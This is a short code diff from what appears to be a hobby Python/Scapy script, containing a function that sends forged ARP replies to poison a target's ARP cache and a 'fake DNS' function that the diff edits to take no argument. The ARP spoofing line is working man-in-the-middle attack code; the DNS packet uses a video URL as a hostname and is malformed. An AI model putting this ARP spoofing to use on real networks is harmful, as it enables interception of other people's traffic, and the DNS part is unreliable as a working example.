@@ -10,8 +10,7 @@ import sys
 def spoofarpcache(targetip, targetmac, sourceip):
     send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 
-def sendFakeDNS(pkt):
-    print(pkt)
+def sendFakeDNS():
     dnsResPacket = DNS(rd=1, qd=DNSQR(qname="https://www.youtube.com/watch?v=dQw4w9WgXcQ"))
     send(dnsResPacket)
 
